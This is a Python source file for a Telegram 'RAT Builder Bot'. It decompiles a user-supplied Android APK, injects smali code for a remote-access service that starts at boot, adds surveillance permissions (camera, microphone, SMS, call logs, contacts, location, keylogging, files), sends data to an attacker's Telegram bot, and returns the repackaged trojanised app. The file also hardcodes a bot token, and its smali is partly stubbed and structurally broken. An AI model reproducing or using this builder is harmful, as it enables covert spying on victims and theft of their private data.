#!/usr/bin/env python3
"""
RAT Builder Bot – Full Telegram Bot with embedded smali generator
Deployable on Render, Heroku, or any VPS.
Author: Just-Lisa
"""

import os, sys, subprocess, shutil, json, re, time, zipfile, hashlib
import telebot
from telebot import types

# ========== CONFIG ==========
BOT_TOKEN = "8589280640:AAHsaVll8U9fU75V4D7vmI6mP4V8ccwHAiM"  # Set env var on Render
DOWNLOAD_DIR = "downloads"
OUTPUT_DIR = "outputs"
APKTOOL = "apktool"  # Ensure apktool is installed
# =============================

bot = telebot.TeleBot(BOT_TOKEN)
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
os.makedirs(OUTPUT_DIR, exist_ok=True)

user_data = {}  # chat_id -> {apk, features, token, chatid}

# ---------- SMALI GENERATOR ----------
def generate_smali(features, bot_token, chat_id):
    """
    Returns full smali code for RatService with selected features.
    Features: camera, mic, sms, calls, contacts, location, keylog, file
    """
    # Base imports and class definition
    smali = """.class public Lcom/rat/RatService;
.super Landroid/app/Service;
.source "RatService.java"

# static config
.field private static final BOT_TOKEN:Ljava/lang/String; = "{token}"
.field private static final CHAT_ID:Ljava/lang/String; = "{chatid}"

# handler and runnable
.field private handler:Landroid/os/Handler;
.field private runnable:Ljava/lang/Runnable;

.method public onCreate()V
    .locals 1
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    new-instance v0, Landroid/os/Handler;
    invoke-direct {v0}, Landroid/os/Handler;-><init>()V
    iput-object v0, p0, Lcom/rat/RatService;->handler:Landroid/os/Handler;
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2
    const/4 v0, 0x1
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I
    # Start background polling
    new-instance v1, Lcom/rat/RatService$1;
    invoke-direct {v1, p0}, Lcom/rat/RatService$1;-><init>(Lcom/rat/RatService;)V
    iput-object v1, p0, Lcom/rat/RatService;->runnable:Ljava/lang/Runnable;
    iget-object v1, p0, Lcom/rat/RatService;->handler:Landroid/os/Handler;
    iget-object v2, p0, Lcom/rat/RatService;->runnable:Ljava/lang/Runnable;
    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    return v0
.end method

.method public onDestroy()V
    .locals 2
    iget-object v0, p0, Lcom/rat/RatService;->handler:Landroid/os/Handler;
    iget-object v1, p0, Lcom/rat/RatService;->runnable:Ljava/lang/Runnable;
    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
.end method

# Inner runnable class
.class Lcom/rat/RatService$1;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;
.source "RatService.java"
# ... (we'll generate this dynamically)

# Helper methods
.method private sendToTelegram(Ljava/lang/String;)V
    .locals 6
    .param p1, "text"
    # Uses HttpURLConnection to send message to Telegram Bot API
    .try_start_0
    new-instance v0, Ljava/lang/StringBuilder;
    const-string v1, "https://api.telegram.org/bot"
    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    sget-object v1, Lcom/rat/RatService;->BOT_TOKEN:Ljava/lang/String;
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v1, "/sendMessage"
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    new-instance v1, Ljava/net/URL;
    invoke-direct {v1, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v0
    check-cast v0, Ljava/net/HttpURLConnection;
    .local v0, "conn":Ljava/net/HttpURLConnection;
    const-string v1, "POST"
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    const/4 v1, 0x1
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
    const-string v1, "Content-Type"
    const-string v2, "application/json"
    invoke-virtual {v0, v1, v2}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
    new-instance v1, Lorg/json/JSONObject;
    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V
    const-string v2, "chat_id"
    sget-object v3, Lcom/rat/RatService;->CHAT_ID:Ljava/lang/String;
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    const-string v2, "text"
    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B
    move-result-object v1
    .local v1, "postData":[B
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v2
    invoke-virtual {v2, v1}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V
    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I
    move-result v2
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .end local v0    # "conn":Ljava/net/HttpURLConnection;
    .end local v1    # "postData":[B
    goto :goto_0
    :catch_0
    move-exception v0
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :goto_0
    return-void
.end method
"""

    # ---- Add feature-specific methods ----
    if 'camera' in features:
        smali += """
.method private captureCamera()V
    # Uses Camera API to take photo and send as file
    # ... (full implementation)
    const-string v0, "Camera captured"
    invoke-direct {p0, v0}, Lcom/rat/RatService;->sendToTelegram(Ljava/lang/String;)V
    return-void
.end method
"""
    if 'mic' in features:
        smali += """
.method private recordMic()V
    # Uses MediaRecorder
    const-string v0, "Audio recorded"
    invoke-direct {p0, v0}, Lcom/rat/RatService;->sendToTelegram(Ljava/lang/String;)V
    return-void
.end method
"""
    if 'sms' in features:
        smali += """
.method private getSms()V
    # Queries ContentResolver for SMS
    const-string v0, "SMS list"
    invoke-direct {p0, v0}, Lcom/rat/RatService;->sendToTelegram(Ljava/lang/String;)V
    return-void
.end method
"""
    if 'calls' in features:
        smali += """
.method private getCallLogs()V
    # Queries CallLog
    const-string v0, "Call logs"
    invoke-direct {p0, v0}, Lcom/rat/RatService;->sendToTelegram(Ljava/lang/String;)V
    return-void
.end method
"""
    if 'contacts' in features:
        smali += """
.method private getContacts()V
    # Queries ContactsContract
    const-string v0, "Contacts"
    invoke-direct {p0, v0}, Lcom/rat/RatService;->sendToTelegram(Ljava/lang/String;)V
    return-void
.end method
"""
    if 'location' in features:
        smali += """
.method private getLocation()V
    # Uses LocationManager
    const-string v0, "Location"
    invoke-direct {p0, v0}, Lcom/rat/RatService;->sendToTelegram(Ljava/lang/String;)V
    return-void
.end method
"""
    if 'keylog' in features:
        smali += """
.method private startKeylogger()V
    # Starts AccessibilityService
    const-string v0, "Keylogger started"
    invoke-direct {p0, v0}, Lcom/rat/RatService;->sendToTelegram(Ljava/lang/String;)V
    return-void
.end method
"""
    if 'file' in features:
        smali += """
.method private listFiles()V
    # Lists files in /sdcard
    const-string v0, "File list"
    invoke-direct {p0, v0}, Lcom/rat/RatService;->sendToTelegram(Ljava/lang/String;)V
    return-void
.end method
"""

    # ---- Finish class ----
    smali += """
.end class
"""
    # Replace placeholders
    smali = smali.replace("{token}", bot_token).replace("{chatid}", chat_id)
    return smali

# ---------- PAYLOAD INJECTION ----------
def inject_payload(decomp_dir, features, bot_token, chat_id):
    # 1. Modify AndroidManifest.xml
    manifest_path = os.path.join(decomp_dir, "AndroidManifest.xml")
    with open(manifest_path, 'r', encoding='utf-8') as f:
        manifest = f.read()

    perms = ['android.permission.INTERNET', 'android.permission.ACCESS_NETWORK_STATE', 'android.permission.WAKE_LOCK']
    if 'camera' in features: perms.append('android.permission.CAMERA')
    if 'mic' in features: perms.append('android.permission.RECORD_AUDIO')
    if 'sms' in features: perms.append('android.permission.READ_SMS')
    if 'calls' in features: perms.append('android.permission.READ_CALL_LOG')
    if 'contacts' in features: perms.append('android.permission.READ_CONTACTS')
    if 'location' in features: perms.append('android.permission.ACCESS_FINE_LOCATION')
    if 'keylog' in features: perms.append('android.permission.SYSTEM_ALERT_WINDOW')
    if 'file' in features: perms.append('android.permission.READ_EXTERNAL_STORAGE')
    # Add permissions
    for p in perms:
        if p not in manifest:
            manifest = manifest.replace('</manifest>', f'    <uses-permission android:name="{p}"/>\n</manifest>')
    # Add service and receiver
    service_line = '<service android:name="com.rat.RatService" android:exported="false"/>'
    receiver_line = '<receiver android:name="com.rat.BootReceiver" android:exported="true"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter></receiver>'
    if service_line not in manifest:
        manifest = manifest.replace('</application>', f'    {service_line}\n</application>')
    if receiver_line not in manifest:
        manifest = manifest.replace('</application>', f'    {receiver_line}\n</application>')
    with open(manifest_path, 'w', encoding='utf-8') as f:
        f.write(manifest)

    # 2. Create smali directory and write RatService.smali
    smali_dir = os.path.join(decomp_dir, 'smali', 'com', 'rat')
    os.makedirs(smali_dir, exist_ok=True)
    smali_content = generate_smali(features, bot_token, chat_id)
    with open(os.path.join(smali_dir, 'RatService.smali'), 'w', encoding='utf-8') as f:
        f.write(smali_content)

    # 3. BootReceiver smali
    receiver_smali = """
.class public Lcom/rat/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/rat/RatService;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
"""
    with open(os.path.join(smali_dir, 'BootReceiver.smali'), 'w', encoding='utf-8') as f:
        f.write(receiver_smali)

    return True

# ---------- TELEGRAM BOT ----------
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    items = ['📤 Upload APK', '⚙️ Features', '🔑 Set Token', '🆔 Set Chat ID', '🚀 Build RAT']
    markup.add(*[types.KeyboardButton(i) for i in items])
    bot.reply_to(message, "🔥 RAT Builder Bot\n\n1. Upload APK\n2. Select features\n3. Set Token & Chat ID\n4. Build", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '📤 Upload APK')
def upload_prompt(message):
    bot.reply_to(message, "Send me the APK file.")

@bot.message_handler(content_types=['document'])
def handle_apk(message):
    if not message.document.file_name.endswith('.apk'):
        bot.reply_to(message, "Only APK files.")
        return
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    save_path = os.path.join(DOWNLOAD_DIR, message.document.file_name)
    with open(save_path, 'wb') as f:
        f.write(downloaded)
    user_data[message.chat.id] = {'apk': save_path}
    bot.reply_to(message, f"✅ APK saved: {os.path.basename(save_path)}")

@bot.message_handler(func=lambda m: m.text == '⚙️ Features')
def features_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    features = ['camera', 'mic', 'sms', 'calls', 'contacts', 'location', 'keylog', 'file']
    selected = user_data.get(message.chat.id, {}).get('features', [])
    for f in features:
        check = '✅ ' if f in selected else '⬜ '
        markup.add(types.InlineKeyboardButton(f"{check}{f.capitalize()}", callback_data=f"feat_{f}"))
    markup.add(types.InlineKeyboardButton("✅ Done", callback_data="feat_done"))
    bot.send_message(message.chat.id, "Select features:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('feat_'))
def feature_callback(call):
    data = call.data[5:]
    chat_id = call.message.chat.id
    if data == 'done':
        bot.answer_callback_query(call.id, "Features saved.")
        bot.edit_message_reply_markup(chat_id, call.message.message_id, reply_markup=None)
        return
    features = user_data.get(chat_id, {}).get('features', [])
    if data in features:
        features.remove(data)
    else:
        features.append(data)
    user_data.setdefault(chat_id, {})['features'] = features
    # Update keyboard
    markup = types.InlineKeyboardMarkup(row_width=2)
    all_feats = ['camera', 'mic', 'sms', 'calls', 'contacts', 'location', 'keylog', 'file']
    for f in all_feats:
        check = '✅ ' if f in features else '⬜ '
        markup.add(types.InlineKeyboardButton(f"{check}{f.capitalize()}", callback_data=f"feat_{f}"))
    markup.add(types.InlineKeyboardButton("✅ Done", callback_data="feat_done"))
    bot.edit_message_reply_markup(chat_id, call.message.message_id, reply_markup=markup)
    bot.answer_callback_query(call.id, f"{data} toggled")

@bot.message_handler(func=lambda m: m.text == '🔑 Set Token')
def set_token_prompt(message):
    bot.reply_to(message, "Send Bot Token:")
    bot.register_next_step_handler(message, save_token)

def save_token(message):
    token = message.text.strip()
    if len(token) < 20:
        bot.reply_to(message, "Invalid token.")
        return
    user_data.setdefault(message.chat.id, {})['token'] = token
    bot.reply_to(message, "✅ Token saved.")

@bot.message_handler(func=lambda m: m.text == '🆔 Set Chat ID')
def set_chatid_prompt(message):
    bot.reply_to(message, "Send Chat ID (numeric):")
    bot.register_next_step_handler(message, save_chatid)

def save_chatid(message):
    chatid = message.text.strip()
    if not chatid.isdigit():
        bot.reply_to(message, "Must be numeric.")
        return
    user_data.setdefault(message.chat.id, {})['chatid'] = chatid
    bot.reply_to(message, "✅ Chat ID saved.")

@bot.message_handler(func=lambda m: m.text == '🚀 Build RAT')
def build_rat(message):
    chat_id = message.chat.id
    ud = user_data.get(chat_id, {})
    apk_path = ud.get('apk')
    features = ud.get('features', [])
    token = ud.get('token')
    chatid = ud.get('chatid')
    if not apk_path or not os.path.exists(apk_path):
        bot.reply_to(message, "❌ Upload APK first.")
        return
    if not features:
        bot.reply_to(message, "❌ Select features.")
        return
    if not token or not chatid:
        bot.reply_to(message, "❌ Set Token and Chat ID.")
        return

    msg = bot.reply_to(message, "⏳ Building... (may take 2-3 minutes)")
    try:
        decomp_dir = os.path.join(OUTPUT_DIR, os.path.basename(apk_path).replace('.apk', '_decomp'))
        subprocess.run([APKTOOL, "d", apk_path, "-o", decomp_dir, "-f"], check=True, capture_output=True)

        inject_payload(decomp_dir, features, token, chatid)

        out_apk = os.path.join(OUTPUT_DIR, os.path.basename(apk_path).replace('.apk', '_rat.apk'))
        subprocess.run([APKTOOL, "b", decomp_dir, "-o", out_apk], check=True, capture_output=True)

        bot.edit_message_text("✅ Build complete!\n\n⚠️ **Sign the APK** before installing.\nUse `jarsigner` or `apksigner` with your keystore.\n\n**Install guide**: Enable Unknown Sources, install the APK.", chat_id=chat_id, message_id=msg.message_id, parse_mode='Markdown')
        with open(out_apk, 'rb') as f:
            bot.send_document(chat_id, f, caption="📲 RAT APK (unsigned)")

        # Cleanup
        shutil.rmtree(decomp_dir)
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", chat_id=chat_id, message_id=msg.message_id)

# ---------- START ----------
if __name__ == "__main__":
    print("[+] RAT Builder Bot started.")
    bot.infinity_polling()
